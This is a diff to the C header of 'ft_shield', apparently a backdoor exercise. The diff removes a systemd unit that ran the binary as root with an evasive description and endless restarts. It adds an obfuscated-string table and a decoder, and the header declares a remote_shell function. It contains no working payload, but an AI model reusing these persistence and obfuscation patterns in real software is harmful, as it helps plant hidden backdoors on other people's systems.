@@ -1,30 +1,22 @@
 #ifndef SHIELD_H
 #define SHIELD_H
 
+#include <stdbool.h>
+#include <stdint.h>
 #include <stdio.h>
 
 #define ACTIVATION_KEY_LEN 64
 
-#define SYSTEMD_CONFIG_PATH "/etc/systemd/system/ft_shield.service"
-
-#define SYSTEMD_CONFIG                                                                                                                                         \
-    "[Unit]\n"                                                                                                                                                 \
-    "Description=None of your business G\n"                                                                                                                    \
-    "After=network.target\n"                                                                                                                                   \
-    "StartLimitIntervalSec=0\n\n"                                                                                                                              \
-                                                                                                                                                               \
-    "[Service]\n"                                                                                                                                              \
-    "Type=simple\n"                                                                                                                                            \
-    "Restart=always\n"                                                                                                                                         \
-    "RestartSec=1\n"                                                                                                                                           \
-    "User=root\n"                                                                                                                                              \
-    "ExecStart=/bin/ft_shield %s\n\n"                                                                                                                             \
-                                                                                                                                                               \
-    "[Install]\n"                                                                                                                                              \
-    "WantedBy=multi-user.target\n"
+typedef struct ObfuscatedStringTableEntry {
+    uint8_t *data;
+    size_t len;
+    bool decoded;
+} ObfuscatedStringTableEntry;
 
 size_t __log(FILE *restrict __stream, const char *restrict __format, ...);
 
 int remote_shell(char **env);
+
+void decode_strings(ObfuscatedStringTableEntry *strings, size_t len);
 
 #endif
